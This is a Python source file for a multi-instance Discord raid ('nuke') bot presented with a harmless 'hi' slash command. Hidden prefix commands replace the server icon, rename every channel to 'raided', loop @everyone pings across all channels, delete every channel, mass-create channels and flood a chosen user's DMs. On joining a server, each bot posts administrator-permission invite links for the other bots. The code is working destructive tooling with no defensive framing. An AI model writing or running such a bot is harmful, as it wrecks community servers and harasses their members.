import asyncio
import discord
from discord import app_commands
import os
import logging
from dotenv import load_dotenv

load_dotenv()

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

PREFIX = "$$"

PHOTO_PATH = "photo_1.png"

BOT_CONFIGS = [
    {"name": "bot1", "token_env": "BOT1_TOKEN", "id": 1492845514318676028},
    {"name": "bot2", "token_env": "BOT2_TOKEN", "id": 1492845592303632384},
    {"name": "bot3", "token_env": "BOT3_TOKEN", "id": 1492845711887171706},
    {"name": "bot4", "token_env": "BOT4_TOKEN", "id": 1492846367582847066},
    {"name": "bot5", "token_env": "BOT5_TOKEN", "id": 1493291019029057586},
]

INVITE_BASE = "https://discord.com/api/oauth2/authorize?client_id={}&permissions=8&scope=bot%20applications.commands"


def get_other_bot_invites(exclude_id: int) -> str:
    lines = []
    for config in BOT_CONFIGS:
        if config["id"] != exclude_id:
            lines.append(f"**{config['name']}** → {INVITE_BASE.format(config['id'])}")
    return "\n".join(lines)


class PingBot(discord.Client):
    def __init__(self, bot_name: str, *, intents: discord.Intents):
        super().__init__(intents=intents)
        self.bot_name = bot_name
        self.tree = app_commands.CommandTree(self)
        self._running_loops: dict[int, asyncio.Task] = {}
        self._last_create_name: str = "raided"
        self._add_slash_commands()

    def _add_slash_commands(self):
        @self.tree.command(name="hi", description="Say hi")
        async def hi_cmd(interaction: discord.Interaction):
            await interaction.response.send_message("hi again")

    async def setup_hook(self):
        await self.tree.sync()
        logger.info(f"[{self.bot_name}] Global slash commands synced.")

    async def on_ready(self):
        logger.info(f"[{self.bot_name}] Logged in as {self.user} (ID: {self.user.id})")
        for guild in self.guilds:
            try:
                self.tree.copy_global_to(guild=guild)
                await self.tree.sync(guild=guild)
                logger.info(f"[{self.bot_name}] Commands synced to: {guild.name}")
            except Exception as e:
                logger.warning(f"[{self.bot_name}] Guild sync failed for {guild.id}: {e}")

    async def on_guild_join(self, guild: discord.Guild):
        logger.info(f"[{self.bot_name}] Joined new guild: {guild.name} ({guild.id})")
        try:
            self.tree.copy_global_to(guild=guild)
            await self.tree.sync(guild=guild)
        except Exception as e:
            logger.warning(f"[{self.bot_name}] Sync failed for new guild {guild.id}: {e}")

        channel = guild.system_channel or next(
            (c for c in guild.text_channels if c.permissions_for(guild.me).send_messages),
            None
        )
        if channel and self.user:
            invites = get_other_bot_invites(exclude_id=self.user.id)
            if invites:
                await channel.send(
                    f"**{self.bot_name}** joined! Add the other bots too:\n{invites}"
                )

    async def on_message(self, message: discord.Message):
        if message.author.bot:
            return
        if not message.content.startswith(PREFIX):
            return

        raw = message.content[len(PREFIX):].strip()
        cmd = raw.lower()

        if cmd.startswith("setup"):
            parts = cmd.split()
            if len(parts) < 2:
                await message.channel.send("Usage: `$$setup <number of pings>`")
                return
            try:
                ping_limit = int(parts[1])
            except ValueError:
                await message.channel.send("Usage: `$$setup <number of pings>` — number must be an integer.")
                return
            guild = message.guild
            if guild is None:
                return

            # Change server icon from photo_1.png
            try:
                with open(PHOTO_PATH, "rb") as f:
                    icon_bytes = f.read()
                await guild.edit(icon=icon_bytes)
                logger.info(f"[{self.bot_name}] Changed server icon for {guild.name}")
            except FileNotFoundError:
                logger.warning(f"[{self.bot_name}] {PHOTO_PATH} not found — skipping icon change")
            except Exception as e:
                logger.warning(f"[{self.bot_name}] Could not change server icon: {e}")

            # Rename all text channels in parallel
            rename_name = self._last_create_name
            await asyncio.gather(
                *[self._safe_rename_channel(ch, rename_name) for ch in guild.text_channels],
                return_exceptions=True
            )

            # Start @everyone ping loops in all channels
            text_channels = list(guild.text_channels)
            started = 0
            for ch in text_channels:
                cid = ch.id
                if cid not in self._running_loops or self._running_loops[cid].done():
                    task = asyncio.create_task(self._everyone_loop(ch, ping_limit))
                    self._running_loops[cid] = task
                    started += 1
            await message.channel.send(f"Sending @everyone {ping_limit} times across {started} channel(s)!")

        elif cmd.startswith("create "):
            parts = raw.split()
            if len(parts) < 3:
                await message.channel.send("Usage: `$$create <name> <number>`")
                return
            ch_name = parts[1]
            try:
                count = int(parts[2])
            except ValueError:
                await message.channel.send("Number must be an integer.")
                return
            guild = message.guild
            if guild is None:
                return
            self._last_create_name = ch_name
            await message.channel.send(f"Creating {count} channel(s) named `{ch_name}`...")
            await asyncio.gather(
                *[self._safe_create_channel(guild, ch_name) for _ in range(count)],
                return_exceptions=True
            )
            await message.channel.send(f"Done! Created {count} channel(s) named `{ch_name}`.")

        elif cmd == "clear":
            guild = message.guild
            if guild is None:
                return
            all_channels = list(guild.channels)
            await message.channel.send(f"Clearing all {len(all_channels)} channels...")

            # Delete all channels in parallel
            await asyncio.gather(
                *[self._safe_delete_channel(c) for c in all_channels],
                return_exceptions=True
            )

            # Create the new channel
            try:
                await guild.create_text_channel("hi da punda")
                logger.info(f"[{self.bot_name}] Created 'hi da punda' in {guild.name}")
            except Exception as e:
                logger.warning(f"[{self.bot_name}] Could not create 'hi da punda': {e}")

        elif cmd.startswith("doit "):
            # $$doit <@user> <number>
            if not message.mentions:
                await message.channel.send("Usage: `$$doit <@user> <number>`")
                return
            parts = raw.split()
            if len(parts) < 3:
                await message.channel.send("Usage: `$$doit <@user> <number>`")
                return
            try:
                count = int(parts[-1])
            except ValueError:
                await message.channel.send("Number must be an integer.")
                return
            target_user = message.mentions[0]
            asyncio.create_task(self._dm_spam(target_user, count))
            await message.channel.send(f"DMing {target_user.mention} {count} time(s)!")

    async def _dm_spam(self, user: discord.User, count: int):
        for i in range(count):
            try:
                if os.path.exists(PHOTO_PATH):
                    with open(PHOTO_PATH, "rb") as f:
                        file = discord.File(f, filename="photo_1.png")
                    await user.send("@everyone", file=file)
                else:
                    await user.send("@everyone")
                await asyncio.sleep(0.1)
            except discord.Forbidden:
                logger.warning(f"[{self.bot_name}] Cannot DM {user} — DMs closed.")
                break
            except discord.HTTPException as e:
                retry = getattr(e, "retry_after", 5)
                logger.warning(f"[{self.bot_name}] Rate limited DMing {user}, waiting {retry}s")
                await asyncio.sleep(retry)
            except Exception as e:
                logger.error(f"[{self.bot_name}] Error DMing {user}: {e}")
                await asyncio.sleep(1)
        logger.info(f"[{self.bot_name}] Finished DMing {user} {count} time(s)")

    async def _safe_rename_channel(self, channel: discord.TextChannel, name: str):
        try:
            await channel.edit(name=name)
        except Exception as e:
            logger.warning(f"[{self.bot_name}] Could not rename #{channel.name}: {e}")

    async def _safe_create_channel(self, guild: discord.Guild, name: str):
        try:
            await guild.create_text_channel(name)
        except Exception as e:
            logger.warning(f"[{self.bot_name}] Could not create channel '{name}': {e}")

    async def _safe_delete_channel(self, channel: discord.abc.GuildChannel):
        try:
            await channel.delete(reason="$$clear command")
        except discord.NotFound:
            pass
        except discord.Forbidden:
            logger.warning(f"[{self.bot_name}] No permission to delete #{channel.name}")
        except Exception as e:
            logger.warning(f"[{self.bot_name}] Could not delete #{channel.name}: {e}")

    async def _everyone_loop(self, channel: discord.TextChannel, limit: int):
        sent = 0
        while sent < limit:
            try:
                await channel.send(
                    "@everyone",
                    allowed_mentions=discord.AllowedMentions(everyone=True)
                )
                sent += 1
                await asyncio.sleep(0.1)
            except discord.Forbidden:
                logger.warning(f"[{self.bot_name}] No permission in #{channel.name}, stopping.")
                break
            except discord.NotFound:
                logger.warning(f"[{self.bot_name}] #{channel.name} deleted, stopping loop.")
                break
            except discord.HTTPException as e:
                retry = getattr(e, "retry_after", 5)
                logger.warning(f"[{self.bot_name}] Rate limited in #{channel.name}, waiting {retry}s")
                await asyncio.sleep(retry)
            except Exception as e:
                logger.error(f"[{self.bot_name}] Error in everyone loop: {e}")
                await asyncio.sleep(1)
        logger.info(f"[{self.bot_name}] Finished sending {sent} @everyone pings in #{channel.name}")


async def run_bot(token: str, bot_name: str):
    intents = discord.Intents.default()
    intents.message_content = True
    while True:
        try:
            client = PingBot(bot_name=bot_name, intents=intents)
            async with client:
                await client.start(token)
        except discord.HTTPException as e:
            wait = 60
            logger.warning(f"[{bot_name}] HTTP error on login ({e.status}), retrying in {wait}s...")
            await asyncio.sleep(wait)
        except Exception as e:
            logger.error(f"[{bot_name}] Unexpected error: {e}, retrying in 30s...")
            await asyncio.sleep(30)


async def main():
    bot_tasks = []
    for config in BOT_CONFIGS:
        token = os.getenv(config["token_env"])
        if not token:
            print(f"[WARNING] {config['token_env']} is not set — skipping {config['name']}")
            continue
        bot_tasks.append(run_bot(token=token, bot_name=config["name"]))

    if not bot_tasks:
        print("No bot tokens found. Please set BOT1_TOKEN, BOT2_TOKEN, BOT3_TOKEN, BOT4_TOKEN.")
        return

    print(f"Starting {len(bot_tasks)} bot(s)...")
    await asyncio.gather(*bot_tasks)


if __name__ == "__main__":
    asyncio.run(main())
